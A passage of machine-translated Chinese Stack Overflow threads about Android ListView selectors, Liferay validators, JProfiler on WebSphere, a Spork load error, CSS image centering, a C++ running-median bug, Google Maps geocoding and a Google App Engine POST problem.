    <solid android:color="@color/my_list_item_pressed_color" />
</shape> 
```

`ListView`并参考在您的选择器中创建的可绘制对象`state_pressed`（也在文件`res/drawable`夹中创建为 XML 文件）：

```
<selector xmlns:android="http://schemas.android.com/apk/res/android" >
    <item android:state_pressed="true" android:drawable="@drawable/list_item_pressed_bg" />
    <item android:drawable="@android:color/transparent" />
</selector> 
```

并在您的`ListView`：

```
<ListView
    .....
    android:listSelector="@drawable/list_item_selector" /> 
```

就这样。至少适用于 Android 2.2-2.3。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-11T17:56:45.743

如果不想更改选择器，也可以将其设置为列表项布局的背景，而不是在 ListView 的 listSelector 字段中。列表项在触摸时处于“选中”状态，颜色显示正确。

这适用于所有版本的 Android。

例如：这是您的列表项布局

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:background="@drawable/background_color">
<TextView
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:text="Your text here" />
</LinearLayout> 
```

你的列表没有列表选择器：

```
<ListView
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" /> 
```

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-06-14T00:35:21.820

我通过删除这一行来解决这个问题：（不知道它为什么起作用）

安卓：listSelector="#99000000"

# liferay-6 - Liferay 合金-ui 验证器

> ID：10989226
> 
> 赞同：0
> 
> 时间：2012-06-12T00:39:41.087
> 
> 标签：liferay-6, alloy-ui

我想通过使用钩子或其他方法更改验证器合金 UI 消息，例如“此字段是必需的”，但我找不到这些消息的位置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T11:10:55.753

您可以在某些挂钩中覆盖 /html/js/liferay/form.js 并更改所需的行： Liferay.Language.get('this-field-is-required') 并为其提供您的自定义语言键。

如果您想为整个门户更改此语言标签，则在某些挂钩中覆盖语言属性并修改键 this-field-is-required 的标签

高温高压

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-01-25T08:13:45.260

你可以使用这样的东西：

```
var formValidator = new A.FormValidator({
                        boundingBox: '#<portlet:namespace/>yourForm',
                        rules: {
                            <portlet:namespace/>yourInput: {
                                required: true,
                                baseChars: true
                            }
                        },
                        fieldStrings: {
                            <portlet:namespace/>yourInput: {
                                required: 'Your custom required message'
                            }
                        },
                        showAllMessages: true
                    }); 
```

然后，如果您想测试您的表格是否有效，只需使用：

```
if (formValidator.hasErrors()) {
                            return false;
                        } else {
                       //your code
                        } 
```

您可以用 Liferay.Language.get('your-required-custom-message') 替换required **:** **'Your custom required message'**

# jprofiler - 如何从 Websphere 服务器中删除 JProfiler 配置？

> ID：10989229
> 
> 赞同：3
> 
> 时间：2012-06-12T00:39:58.107
> 
> 标签：jprofiler

在过去的几天里，我一直在使用 JProfiler 来分析本地运行的 Websphere 7 服务器（来自 RAD8）。我已经使用 JProfiler 的服务器集成功能连接到 WAS 实例。

我现在想从 WAS 服务器实例中删除概要分析 - 每当我启动服务器时，它都会显示为“概要分析” - 即使 JProfiler 没有运行。你如何从服务器上“解开”JProfiler？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T09:35:32.697

JProfiler 中的集成向导会`server.xml`在同一目录中创建配置文件的备份。您可以使用该备份恢复以前的状态。

或者，编辑 server.xml，查找“-agentpath:...”并删除该 VM 参数。

# android - 使用选项卡视图

> ID：10989236
> 
> 赞同：0
> 
> 时间：2012-06-12T00:40:46.140
> 
> 标签：android, android-layout

我有一个带有 3 个选项卡的 TabbedView 活动。目前，只有第一个选项卡有正确的图标，其他两个是空白的。

我的xml文件如下：

```
<selector xmlns:android="http://schemas.android.com/apk/res/android">
<item android:drawable="@drawable/news" android:state_selected="true" />
<item android:drawable="@drawable/score" android:state_selected="true" />
<item android:drawable="@drawable/schedule" android:state_selected="true" />
</selector> 
```

新闻图标是出现的那个。这是我的选项卡式视图活动。我期待看到第二个选项卡图标是得分图标，第三个选项卡是日程图标：

```
 //Headlines
    intent = new Intent().setClass(this, HeadlineBoard.class);
    intent.putExtra(Constants.SPORT_NAME_EXTRA, sportsName);
    intent.putExtra(Constants.HEADLINES_FOR_SPORT_EXTRA, headlines);
    spec = tabHost.newTabSpec("news").setIndicator("Headlines",
                      res.getDrawable(R.drawable.hl_aggie))
                  .setContent(intent);
    tabHost.addTab(spec);

    //Scores
    intent = new Intent().setClass(this, ScoreBoard.class);
    intent.putExtra(Constants.SPORT_NAME_EXTRA, sportsName);
    intent.putExtra(Constants.SCORES_FOR_SPORT_EXTRA, scores);
    spec = tabHost.newTabSpec("score").setIndicator("Scores",       
                      res.getDrawable(R.drawable.hl_aggie))
                  .setContent(intent);
    tabHost.addTab(spec);

    //Schedule
    intent = new Intent().setClass(this, ScheduleBoard.class);
    intent.putExtra(Constants.SPORT_NAME_EXTRA, sportsName);
    intent.putExtra(Constants.SCHEDULE_FOR_SPORT_EXTRA, scheduleIn);
    spec = tabHost.newTabSpec("schedule").setIndicator("Schedule",
                      res.getDrawable(R.drawable.hl_aggie))
                  .setContent(intent);
    tabHost.addTab(spec);       
    tabHost.setCurrentTab(0); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:01:40.140

如果您只想显示所有图标，为什么不将所有图标可绘制对象分别设置到每个选项卡？

`TabSpec scoreSpec= tabHost.newTabSpec("score");`

`scoreSpec.setIndicator("scores", getResources().getDrawable(R.drawable.score));`

这是[参考](http://developer.android.com/resources/tutorials/views/hello-tabwidget.html)..

# rspec-rails - Spork 不能加载这样的文件？

> ID：10989237
> 
> 赞同：5
> 
> 时间：2012-06-12T00:40:56.073
> 
> 标签：rspec-rails, spork

我有一个 spork gem 问题。每次我运行 spork 命令时，我都会收到这个长错误：

```
evan@TheBeast-Computer:~/rails_projects/sample_app$ spork
Using RSpec
Preloading Rails environment
Loading Spork.prefork block...
cannot load such file -- /home/evan/rails_projects/sample_app/spec_helper (LoadError)
/home/evan/rails_projects/sample_app/spec/spec_helper.rb:57:in `require_relative'
/home/evan/rails_projects/sample_app/spec/spec_helper.rb:57:in `block in <top (required)>'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork.rb:24:in `prefork'
/home/evan/rails_projects/sample_app/spec/spec_helper.rb:6:in `<top (required)>'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/activesupport-3.2.5/lib/active_support/dependencies.rb:245:in `load'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/activesupport-3.2.5/lib/active_support/dependencies.rb:245:in `block in load'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/activesupport-3.2.5/lib/active_support/dependencies.rb:236:in `load_dependency'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/activesupport-3.2.5/lib/active_support/dependencies.rb:245:in `load'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork/test_framework.rb:138:in `block (2 levels) in preload'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork/app_framework/rails.rb:8:in `preload'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork/test_framework.rb:134:in `block in preload'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork.rb:62:in `exec_prefork'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork/test_framework.rb:120:in `preload'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork/run_strategy/forking.rb:25:in `preload'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork/runner.rb:74:in `run'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/lib/spork/runner.rb:10:in `run'
/home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/bin/spork:10:in `<top (required)>'
/home/evan/.rvm/gems/ruby-1.9.3-p194/bin/spork:23:in `load'
/home/evan/.rvm/gems/ruby-1.9.3-p194/bin/spork:23:in `<main>' 
```

这是我的 Gemfile：

```
source 'https://rubygems.org'

gem 'rails', '3.2.5'

gem 'sqlite3'

group :assets do
  gem 'sass-rails',   '~> 3.2.3'
  gem 'coffee-rails', '~> 3.2.1'

  gem 'uglifier', '>= 1.0.3'
end

gem 'jquery-rails'

group :development, :test do
  gem 'rspec-rails',    ">= 2.0.1"
end

group :test do
  gem 'rspec-rails', '>= 2.0.1'
  gem 'spork', '>= 0.8.4'
end 
```

我不知道该做什么或如何描述我的情况。但是我在 Ruby on Rails 3 Tutorial 书中看到的结果显示：

```
$ spork
Using RSpec
Loading Spork.prefork block...
Spork is ready and listening on 8989! 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-13T19:39:23.940

刚刚更新系统后遇到同样的问题。这是由于缺少对文件的读取权限。

一个简单的 chmod +r 为我工作：

```
sudo chmod +r /home/evan/.rvm/gems/ruby-1.9.3-p194/gems/spork-0.9.2/bin/spork 
```

编辑

更新到 Rails 3.2.9 和 Ruby 1.9.3-p327 时，我又遇到了这个问题。不幸的是，这一次不是来自访问权限问题，而是来自两个更新之间演变的宝石（应该是完全透明的）。所以如果你遇到这个问题，如果你没有访问权限问题，你还应该检查哪个文件丢失，并正确升级相应的gem。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T13:47:22.723

从外观上看，您在 spork 尝试加载的“spec”文件夹中有“spec_helper.rb”文件，并且在第 57 行的该文件中，您有一个块，其中有一个`require_relative "../spec_helper"`指向“spec_helper.rb”文件的语句在根项目文件夹中，ruby '无法加载此类文件'，因为它丢失了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-14T00:06:25.457

有同样的问题，但能够进入 spec_help.rb 文件并保存它。一旦我这样做了，它就开始工作了。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-26T11:35:39.313

我使用 Rails 3.2.12 和 ruby​​-1.9.3-p392。就我而言，添加`require 'spork'`到我的 Gemfile 并运行`bundle install`就可以了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-24T22:37:55.957

我实际上遇到了同样的问题。在我的环境/test.rb 文件中，我将 config.cache_classes 设置为 true。

实际上，需要将 config.cache_classes 设置为 false 才能使 Spork 正常工作。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-10-05T18:12:21.647

我有同样的问题。我曾有一个

```
require 'spec_helper' 
```

spec_helper.rb 文件本身中的行...可以说以递归方式要求 spec_helper.rb 文件。只需消除那条线，现在一切正常。

# html - 在 div 内水平居中图像

> ID：10989238
> 
> 赞同：457
> 
> 时间：2012-06-12T00:40:57.310
> 
> 标签：html, css

这可能是一个愚蠢的问题，但由于通常的居中对齐图像的方法不起作用，我想我会问。如何在其容器 div 内居中对齐（水平）图像？

这是HTML和CSS。我还为缩略图的其他元素添加了 CSS。它按降序运行，因此最高元素是所有内容的容器，最低元素在所有内容中。

```
#thumbnailwrapper {
      color: #2A2A2A;
      margin-right: 5px;
      border-radius: 0.2em;
      margin-bottom: 5px;
      background-color: #E9F7FE;
      padding: 5px;
      border: thin solid #DADADA;
      font-size: 15px
}

#artiststhumbnail {
      width: 120px;
      height: 108px;
      overflow: hidden;
      border: thin solid #DADADA;
      background-color: white;
}

#artiststhumbnail:hover {
      left: 50px
}
```

```
<!--link here-->

<a href="NotByDesign">
  <div id="thumbnailwrapper">

    <a href="NotByDesign">

      <!--name here-->
      <b>Not By Design</b>
      <br>

      <div id="artiststhumbnail">

        <a href="NotByDesign">

          <!--image here-->
          <img src="../files/noprofile.jpg" height="100%" alt="Not By Design" border="1" />
        </a>
      </div>

      <div id="genre">Punk</div>

  </div>
```

好的，我已经添加了没有 PHP 的标记，所以应该更容易看到。这两种解决方案在实践中似乎都行不通。顶部和底部的文本不能居中，图像应在其容器 div 中居中。容器已隐藏溢出，因此我想查看图像的中心，因为这通常是焦点所在的位置。

* * *

## 回答 #1

> 赞同：955
> 
> 时间：2012-06-12T00:46:19.973

```
#artiststhumbnail a img {
    display:block;
    margin:auto;
} 
```

这是我的解决方案：http: [//jsfiddle.net/marvo/3k3CC/2/](http://jsfiddle.net/marvo/3k3CC/2/)

* * *

## 回答 #2

> 赞同：133
> 
> 时间：2015-12-10T13:04:37.477

CSS [**flexbox**](https://css-tricks.com/snippets/css/a-guide-to-flexbox/)可以[`justify-content: center`](https://developer.mozilla.org/en-US/docs/Web/CSS/justify-content)在图像父元素上完成。要保留图像的纵横比，请添加`align-self: flex-start;`它。

**HTML**

```
<div class="image-container">
  <img src="http://placehold.it/100x100" />
</div> 
```

**CSS**

```
.image-container {
  display: flex;
  justify-content: center;
} 
```

**输出：**

```
body {
  background: lightgray;
}
.image-container {
  width: 200px;
  display: flex;
  justify-content: center;
  margin: 10px;
  padding: 10px;
  /* Material design properties */
  background: #fff;
  box-shadow: 0 2px 2px 0 rgba(0, 0, 0, 0.14), 0 3px 1px -2px rgba(0, 0, 0, 0.2), 0 1px 5px 0 rgba(0, 0, 0, 0.12);
}
.image-2 {
  width: 500px;
  align-self: flex-start;  /* to preserve image aspect ratio */
}
.image-3 {
  width: 300px;
  align-self: flex-start;  /* to preserve image aspect ratio */
}
```

```
<div class="image-container">
  <img src="http://placehold.it/100x100" />
</div>

<div class="image-container image-2">
  <img src="http://placehold.it/100x100/333" />
</div>

<div class="image-container image-3">
  <img src="http://placehold.it/100x100/666" />
</div>
```

* * *

## 回答 #3

> 赞同：76
> 
> 时间：2014-08-29T13:35:08.613

我刚刚在 W3 CSS 页面上找到了这个解决方案，它回答了我的问题。

```
img {
    display: block;
    margin-left: auto;
    margin-right: auto;
} 
```

来源：[http ://www.w3.org/Style/Examples/007/center.en.html](http://www.w3.org/Style/Examples/007/center.en.html)

* * *

## 回答 #4

> 赞同：22
> 
> 时间：2014-10-06T11:13:26.553

这也可以

```
#imagewrapper {
    text-align:center;
}

#imagewrapper img {
    display:inline-block;
    margin:0 5px;
} 
```

* * *

## 回答 #5

> 赞同：18
> 
> 时间：2018-01-20T22:59:21.170

我发现（似乎适用于所有浏览器）水平居中图像或任何元素的最佳方法是创建一个 CSS 类并包含以下参数：

**CSS**

```
.center {
    position: relative;          /* where the next element will be automatically positioned */
    display: inline-block;       /* causes element width to shrink to fit content */
    left: 50%;                   /* moves left side of image/element to center of parent element */
    transform: translate(-50%);  /* centers image/element on "left: 50%" position */
} 
```

然后，您可以将您创建的 CSS 类应用到您的标签，如下所示：

**HTML**

```
<img class="center" src="image.jpg" /> 
```

您还可以通过执行以下操作在元素中内联 CSS：

```
<img style="position: relative; display: inline-block; left: 50%; transform: translate(-50%);" src ="image.jpg" /> 
```

...但我不建议内联编写 CSS，因为如果您想更改样式，则必须使用居中的 CSS 代码对所有标签进行多次更改。

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2015-04-28T08:40:11.863

这就是我最终做的事情：

```
<div style="height: 600px">
   <img src="assets/zzzzz.png" alt="Error" style="max-width: 100%; 
        max-height: 100%; display:block; margin:auto;" />
</div> 
```

这会将图像高度限制为 600 像素，并将水平居中（如果父宽度较小，则调整大小）到父容器，保持比例。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2012-06-12T01:37:30.850

我要四处走动，说以下就是你所追求的。

请注意，我认为在问题中意外省略了以下内容（见评论）：

```
<div id="thumbnailwrapper"> <!-- <<< This opening element -->
    <div id="artiststhumbnail">
... 
```

所以你需要的是：

```
#artiststhumbnail {
    width:120px;
    height:108px;
    margin: 0 auto; /* <<< This line here. */
    ...
} 
```

[http://jsfiddle.net/userdude/XStjX/3/](http://jsfiddle.net/userdude/XStjX/3/)

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2016-01-17T20:32:47.650

将此添加到您的 CSS 中：

```
#artiststhumbnail a img {
   display: block;
   margin-left: auto;
   margin-right: auto;
} 
```

只是引用一个子元素，在这种情况下是图像。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2017-06-06T08:20:33.777

要水平居中图像，可以这样：

```
<p style="text-align:center"><img src=""></p> 
```

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2015-03-25T03:37:43.010

为左右设置相等的像素填充：

```
<div id="artiststhumbnail" style="padding-left:ypx;padding-right:ypx"> 
```

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2019-01-20T02:44:16.560

我尝试了几种方法。但这种方式对我来说非常有效

```
<img src="~/images/btn.png" class="img-responsive" id="hide" style="display: block; margin-left: auto; margin-right: auto;" /> 
```

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2016-02-22T05:21:02.530

把图片放在一个`newDiv`. 使包含的宽度`div`与图像相同。适用`margin: 0 auto;`于`newDiv`. 那应该`div`在容器内居中。

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2020-05-21T09:56:10.973

是的，像这样的代码工作正常

```
<div>
 <img/>
</div> 
```

但只是为了提醒你，图像的风格

```
object-fit : *depend on u* 
```

所以最终的代码就像示例

```
div {
  display: flex;
  justify-content: center;
  align-items: center;
}

div img {
  object-fit: contain;
}
```

```
<div style="border: 1px solid red;">
  <img src="https://img.joomcdn.net/9dd32cbfa0cdd7f48ca094972ca47727cd3cd82c_original.jpeg" alt="" srcset="" style="
       border-radius: 50%;
       height: 7.5rem;
       width: 7.5rem;
       object-fit: contain;" />
</div>
```

[![最后结果](../Images/bf0e6f5fe6dbdca2eab15c71ca149413.png)](https://i.stack.imgur.com/yUQDJ.png)

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2016-03-24T08:42:41.797

使用定位。以下对我有用......（水平和垂直居中）

缩放到图像的中心（图像填充 div）：

```
div{
    display:block;
    overflow:hidden;
    width: 70px; 
    height: 70px;  
    position: relative;
}
div img{
    min-width: 70px; 
    min-height: 70px;
    max-width: 250%; 
    max-height: 250%;    
    top: -50%;
    left: -50%;
    bottom: -50%;
    right: -50%;
    position: absolute;
} 
```

没有缩放到图像的中心（图像不**填充**div）：

```
 div{
        display:block;
        overflow:hidden;
        width: 100px; 
        height: 100px;  
        position: relative;
    }
    div img{
        width: 70px; 
        height: 70px; 
        top: 50%;
        left: 50%;
        bottom: 50%;
        right: 50%;
        position: absolute;
    } 
```

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2017-09-25T05:33:45.490

## 在 div 中将图像居中

```
/* standar */
div, .flexbox-div {
  position: relative;
  width: 100%;
  height: 100px;
  margin: 10px;
  background-color: grey;  
}

img {
  border: 3px solid red;
  width: 75px;
  height: 75px;
}
/* || standar */

/* transform */
.transform {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  -ms-transform: translate(-50%, -50%); /* IE 9 */
  -webkit-transform: translate(-50%, -50%); /* Chrome, Safari, Opera */ 
}
/* || transform */

/* flexbox margin */
.flexbox-div {
  display: -webkit-flex;
  display: flex;
  background-color: lightgrey; 
}

.margin-img {
  margin: auto;
}
/* || flexbox margin */

/* flexbox justify align */
.flexbox-justify {
  justify-content: center;
}

.align-item {
  align-self: center;
}
/* || flexbox justify align */
```

```
<h4>Using transform </h4>  
<div>
  <img class="transform" src="http://placeholders.org/250/000/fff" alt="Not By Design" border="1" />
</div>

<h4>Using flexbox margin</h4>  
<div class="flexbox-div">
  <img class="margin-img" src="http://placeholders.org/250/000/fff" alt="Not By Design" border="1" />
</div>

<h4>Using flexbox justify align</h4>  
<div class="flexbox-div flexbox-justify">
  <img class="align-item" src="http://placeholders.org/250/000/fff" alt="Not By Design" border="1" />
</div>
```

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2020-06-02T22:09:52.603

使图像居中的响应方式可以是这样的：

```
.center {
    display: block;
    margin: auto;
    max-width: 100%;
    max-height: 100%;
} 
```

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2016-12-19T12:57:40.927

您可以使用最少代码的弹性框对齐您的内容

**HTML**

```
<div class="image-container">
<img src="https://image.freepik.com/free-vector/modern-abstract-background_1048-1003.jpg" width="100px"> 
</div> 
```

**CSS**

```
.image-container{
  width:100%;
  background:green;
  display:flex; 
```

```
.image-container{
  width:100%;
  background:green;
  display:flex;
  justify-content: center;
  align-items:center;
}
```

```
<div class="image-container">
<img src="https://image.freepik.com/free-vector/modern-abstract-background_1048-1003.jpg" width="100px"> 
</div>
```

js小提琴链接[https://jsfiddle.net/7un6ku2m/](https://jsfiddle.net/7un6ku2m/)

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2017-07-11T20:21:55.323

如果您必须内联（例如在使用输入框时），
这里有一个对我有用的快速技巧：将您的（在这种情况下为图片链接）
用`div``style="text-align:center"`

```
<div style="text-align:center">

<a title="Example Image: Google Logo" href="https://www.google.com/" 
target="_blank" rel="noopener"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo. Click to visit Google.com" border="0" data-recalc-dims="1" /></a>

<h6><strong>This text will also be centered </strong></h6>

</div> /* ends centering style */ 
```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2020-06-21T05:02:40.277

```
.document {
  align-items: center;
  background-color: hsl(229, 57%, 11%);
  border-radius: 5px;
  display: flex;
  height: 40px;
  width: 40px;
}

.document img {
  display: block;
  margin: auto;
}
```

```
<div class="document">
  <img src="./images/icon-document.svg" alt="icon-document" />
</div>
```

* * *

## 回答 #20

> 赞同：-1
> 
> 时间：2021-02-12T14:28:34.370

**样式.css**

```
img#center-img{

 display: block;
 margin: auto;
} 
```

**html**

```
<html>
  <body>
    <div>
      <img src='pic.png' id='center-img'>
    </div>
  </body>
</html> 
```

* * *

## 回答 #21

> 赞同：-1
> 
> 时间：2016-04-17T15:59:02.643

```
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

      <style>
      body{
  /*-------------------important for fluid images---\/--*/
  overflow-x: hidden; /* some browsers shows it for mysterious reasons to me*/
  overflow-y: scroll;
  margin-left:0px;
  margin-top:0px;
  /*-------------------important for fluid images---/\--*/
      }
      .thirddiv{
      float:left;
      width:100vw;
      height:100vh;
      margin:0px;
      background:olive;
      }
      .thirdclassclassone{
      float:left;   /*important*/
      background:grey;
      width:80vw;
      height:80vh; /*match with img height bellow*/
      margin-left:10vw; /* 100vw minus "width"/2    */
      margin-right:10vw; /* 100vw minus "width"/2   */
      margin-top:10vh;
      }
      .thirdclassclassone img{
      position:relative; /*important*/
     display: block;  /*important*/
    margin-left: auto;  /*very important*/
    margin-right: auto;  /*very important*/
    height:80vh; /*match with parent div above*/

    /*--------------------------------
    margin-top:5vh;
    margin-bottom:5vh;
    ---------------------------------*/
    /*---------------------set margins to match total  height of parent di----------------------------------------*/
      }
    </style>           
</head>  
<body>
    <div class="thirddiv">
       <div class="thirdclassclassone">
       <img src="ireland.png">
    </div>      
</body>
</html> 
```

* * *

## 回答 #22

> 赞同：-1
> 
> 时间：2018-02-15T11:49:20.517

```
##Both Vertically and Horizontally center of the Page
.box{
    width: 300px;
    height: 300px;
    background-color: #232532;
    position: fixed;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    margin: auto;
} 
```

* * *

## 回答 #23

> 赞同：-1
> 
> 时间：2021-11-23T14:33:35.567

要使图像居中，请使用此 css。您必须在图像的第一个位置给出宽度。

```
img{
  width: 300px;
  position: fixed;
  left0;
  right:0;

} 
```

# c++ - 使用计数选择（C++）运行中值算法

> ID：10989239
> 
> 赞同：2
> 
> 时间：2012-06-12T00:41:00.083
> 
> 标签：c++, select, counting, median

我正在尝试使用计数选择来实现运行中值算法并且卡住了。

要分析的序列称为“mySequence”，我创建了 2 个全局变量；数据和计数的向量。数据是 mySequence 被一一传输的内容，而 counts 是每个元素的计数。

我担心我可能完全弄错了，或者错过了重要的一步。

```
#include <cstdlib>
#include <iostream>
#include <stdio.h>
#include <vector>

using namespace std;
int maximum = 0;
vector<int> data;
vector<int> counts;
vector<int>::iterator it;

/*
 * A Program that calculates and outputs the running median of a sequence of values
 */

/////////////////////////////////////////////////////////////////////////////
// This function prints the running median of a sequence of values past to it
/////////////////////////////////////////////////////////////////////////////

void runningMedian(int element, int k) { // vector<int> &data
    maximum = data.size(); // finds how many data elements are to be processed  

    for (int i = 0; i <= maximum; i++) // this creates the counts for each element
    {
        counts[element] += 1;
    }

    int c = 0;
    while (k >= 0) {
        k -= counts[c++];
        }
    cout << c - 1;

}

/////////////////////////////////////////////////////////////////
// This main function uses test data to test the above functions
/////////////////////////////////////////////////////////////////

int main(int argc, char** argv) {

    int mySequence [] = {7, 9, 3, 8, 0, 2, 4, 8, 3, 9}; // test sequence
    for (int i = 1; i <= 10; i++) counts.push_back(0); // This initialises the counts vector all to 0

    /// prints out the sequence of the data ///
    cout << "Sequence: ";
    for (int i = 0; i < 10; i++) {
        cout << mySequence[i] << " ";
    }
    cout << endl;
    /// /// /// /// ///

    cout << "Running Medians: ";
    for (int i = 0; i < 10; i++) {
        data.push_back(mySequence[i]); // puts sequence into vector 1 by 1
        runningMedian(mySequence[i], (data.size() / 2));
        cout << " ";
    }

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T00:50:36.140

这看起来像一个错误：

```
void runningMedian(int element, int k) { // vector<int> &data
    maximum = data.size(); // finds how many data elements are to be processed  

    for (int i = 0; i <= maximum; i++) // this creates the counts for each element
    {
        counts[element] += 1;
    } 
```

当我看到一个`for`循环迭代时我会担心`i=0; i<= ...`——它实际上会迭代`maximum+1`多次，而不是`maximum`多次。（惯用语是`i=0; i< ...`。）这通常是导致缓冲区溢出或未初始化内存访问的快速途径——但由于您甚至没有`i`在这种情况下使用，因此不会产生这种影响。我想你的意思是`i`而不是`element`- 否则为什么还要麻烦循环呢？这可以在没有这样的循环的情况下重写：

```
counts[element] += (maximum + 1); 
```

（您可以看到为什么我认为您可能打算`i`用作数组索引。）

对我来说没有什么特别突出的，但也许我也忽略了它。

# android - 光标获取行 id 返回 0

> ID：10989240
> 
> 赞同：1
> 
> 时间：2012-06-12T00:41:01.273
> 
> 标签：android, sqlite, cursor

我正在尝试检索表中行的行 ID，但所有行都为零。这基本上就是我正在做的事情：

```
long getIdForPosition(int position) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, sortOrder);
    cursor.moveToPosition(position);
    long _id = cursor.getLong(cursor.getColumnIndex(MyTable.COLUMN_ID)); // The value for COLUMN_ID is "_id"
    cursor.close();
    return _id
} 
```

这将为所有行返回零。光标有效且移动到有效位置

# google-maps - 谷歌地图 v3 将地址转换为纬度

> ID：10989245
> 
> 赞同：3
> 
> 时间：2012-06-12T00:41:41.710
> 
> 标签：google-maps, google-maps-api-3, geolocation

我只是想从街道地址 => lat/long 转换表单字段。理想情况下，用户输入邮政编码或完整的街道地址，隐藏字段会填充相应的纬度/经度。无需创建地图。不需要方向。只是一个简单的转换。有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T01:03:14.787

您可以使用[Google 地图地理编码网络服务](https://developers.google.com/maps/documentation/geocoding/)。但是，请注意，根据服务条款，您必须在 Google 地图上显示结果。

如果您想使用 JavaScript，可以使用[Google Maps API Geocoder](https://developers.google.com/maps/documentation/javascript/geocoding)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:18:08.600

[SmartyStreets](http://smartystreets.com)有一个名为[LiveAddress](http://smartystreets.com/products/liveaddress-api)的API ，它非常容易连接，它不仅可以对地址进行地理编码，还可以验证它是否正确和完整。这是一个简单的带有 JSON 输出的 REST 端点，因此很容易与[Javascript](https://github.com/smartystreets/LiveAddressSamples/blob/master/jQuery/street-address.html)、[PHP](https://github.com/smartystreets/LiveAddressSamples/blob/master/php/get.php)等一起使用。（它实际上每秒可以支持数千个地址，每个请求最多 100 个地址。）

正如安德烈斯所提到的，在使用他们的服务获取纬度/经度时，您需要显示谷歌地图。还有其他 API 没有这种限制，但它们中的大多数都不会验证地址是否实际存在（例如 Google，它只是近似值），并且它们通常具有较低的使用限制。

像 LiveAddress 这样的 API 只会返回有效地址的结果，*如果*它们是真实的，则会返回接近匹配的结果，并且没有许可证限制会阻止您在特定情况下使用它。

我是 SmartyStreets 的开发人员之一，因此我很乐意帮助您解决有关使用地址的任何其他问题。

*顺便说一句，这里有一个不为人知的秘密：您实际上可以将地址作为单行提交（这意味着您的表单中只需要一个字段而不是 4 或 5）并且您仍然会得到有效的结果. 这是一个使用[jQuery](https://github.com/smartystreets/LiveAddressSamples/blob/master/jQuery/slap.html)和[PHP](https://github.com/smartystreets/LiveAddressSamples/blob/master/php/slap.php)的例子。*

# iphone - Google App Engine Java - 对于 POST 参数，request.getParameter 在部署时返回 null，但在本地工作

> ID：10989246
> 
> 赞同：1
> 
> 时间：2012-06-12T00:41:46.467
> 
> 标签：iphone, ios, google-app-engine, jakarta-ee, nsurlconnection

我正在尝试通过 iPhone 应用程序的 POST 将参数发布到 Google App Engine 上的 Java servlet。当服务器在本地运行时，这可以正常工作，但是当它部署到 App Engine 时，参数始终为空。为什么？

应用引擎代码：

```
String facebookFriendTokens = (String) req.getParameter("facebookFriendTokens");
//running on localhost, facebookFriendTokens works fine, deployed to GAE it's always null
log.warning("Facebook friends = " + facebookFriendTokens); 
```

手机代码：

```
NSString *urlString = [NSString stringWithFormat:@"%@/new_huddle?access_token=%@", SERVER_URL, [defaults objectForKey:@"FBAccessTokenKey"]];
NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
[request setHTTPMethod:@"POST"];
[request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"content-type"];
